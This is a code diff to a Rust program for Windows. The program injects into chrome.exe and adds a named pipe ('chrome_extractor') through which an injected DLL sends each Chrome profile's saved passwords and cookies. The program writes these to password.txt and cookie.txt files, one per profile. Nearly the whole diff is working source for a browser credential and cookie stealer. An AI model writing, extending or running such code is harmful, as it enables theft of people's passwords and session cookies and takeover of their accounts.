@@ -1,13 +1,40 @@
 use clap::Parser;
+use serde::{Deserialize, Serialize};
 use std::ffi::OsStr;
+use std::fs;
+use std::io::{Read, Write};
 use std::os::windows::ffi::OsStrExt;
+use std::path::Path;
 use std::ptr;
 use windows_sys::Win32::Foundation::*;
+use windows_sys::Win32::Storage::FileSystem::*;
 use windows_sys::Win32::System::Diagnostics::Debug::*;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
 use windows_sys::Win32::System::LibraryLoader::*;
 use windows_sys::Win32::System::Memory::*;
+use windows_sys::Win32::System::Pipes::*;
 use windows_sys::Win32::System::Threading::*;
+
+#[derive(Serialize, Deserialize, Debug)]
+struct PasswordData {
+    url: String,
+    username: String,
+    password: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct CookieData {
+    host: String,
+    name: String,
+    value: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct ProfileData {
+    name: String,
+    passwords: Vec<PasswordData>,
+    cookies: Vec<CookieData>,
+}
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -198,6 +225,106 @@ fn main() {
             eprintln!("Failed to resume main thread: {}", GetLastError());
         } else {
             println!("Resumed chrome.exe main thread.");
+        }
+
+        // Create Named Pipe
+        let pipe_name: Vec<u16> = OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
+        let pipe_handle = CreateNamedPipeW(
+            pipe_name.as_ptr(),
+            PIPE_ACCESS_INBOUND,
+            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+            1,
+            65536,
+            65536,
+            0,
+            ptr::null(),
+        );
+
+        if pipe_handle == INVALID_HANDLE_VALUE {
+            eprintln!("Failed to create named pipe: {}", GetLastError());
+        } else {
+            println!("Named pipe created. Waiting for connection...");
+
+            if ConnectNamedPipe(pipe_handle, ptr::null_mut()) != 0 || GetLastError() == ERROR_PIPE_CONNECTED {
+                println!("DLL connected to pipe. Receiving data...");
+                let mut buffer = Vec::new();
+                let mut temp_buffer = [0u8; 4096];
+
+                loop {
+                    let mut bytes_read: u32 = 0;
+                    let success = ReadFile(
+                        pipe_handle,
+                        temp_buffer.as_mut_ptr() as *mut _,
+                        temp_buffer.len() as u32,
+                        &mut bytes_read,
+                        ptr::null_mut(),
+                    );
+
+                    if (success != 0 || GetLastError() == ERROR_MORE_DATA) && bytes_read > 0 {
+                        buffer.extend_from_slice(&temp_buffer[..bytes_read as usize]);
+                        if success != 0 {
+                            break;
+                        }
+                    } else {
+                        let err = GetLastError();
+                        if err == ERROR_BROKEN_PIPE {
+                            break;
+                        } else {
+                            eprintln!("ReadFile failed: {}", err);
+                            break;
+                        }
+                    }
+                }
+
+                if !buffer.is_empty() {
+                    match serde_json::from_slice::<Vec<ProfileData>>(&buffer) {
+                        Ok(profiles) => {
+                            let chrome_dir = Path::new("chrome");
+                            if let Err(e) = fs::create_dir_all(chrome_dir) {
+                                eprintln!("Failed to create chrome directory: {}", e);
+                            } else {
+                                for (i, profile) in profiles.into_iter().enumerate() {
+                                    let folder_name = format!("profile {}", i + 1);
+                                    let profile_dir = chrome_dir.join(&folder_name);
+                                    if let Err(e) = fs::create_dir_all(&profile_dir) {
+                                        eprintln!("Failed to create profile directory {}: {}", folder_name, e);
+                                        continue;
+                                    }
+
+                                    // Save passwords
+                                    match fs::File::create(profile_dir.join("password.txt")) {
+                                        Ok(mut pass_file) => {
+                                            for p in profile.passwords {
+                                                if let Err(e) = writeln!(pass_file, "URL: {}\nUser: {}\nPass: {}\n", p.url, p.username, p.password) {
+                                                    eprintln!("Failed to write to password.txt: {}", e);
+                                                }
+                                            }
+                                        }
+                                        Err(e) => eprintln!("Failed to create password.txt: {}", e),
+                                    }
+
+                                    // Save cookies
+                                    match fs::File::create(profile_dir.join("cookie.txt")) {
+                                        Ok(mut cookie_file) => {
+                                            for c in profile.cookies {
+                                                if let Err(e) = writeln!(cookie_file, "Host: {} | Name: {} | Value: {}", c.host, c.name, c.value) {
+                                                    eprintln!("Failed to write to cookie.txt: {}", e);
+                                                }
+                                            }
+                                        }
+                                        Err(e) => eprintln!("Failed to create cookie.txt: {}", e),
+                                    }
+                                    println!("Saved data for profile: {} as {}", profile.name, folder_name);
+                                }
+                            }
+                        }
+                        Err(e) => eprintln!("Failed to deserialize profile data: {}", e),
+                    }
+                }
+            } else {
+                eprintln!("ConnectNamedPipe failed: {}", GetLastError());
+            }
+            CloseHandle(pipe_handle);
         }
 
         CloseHandle(process_handle);
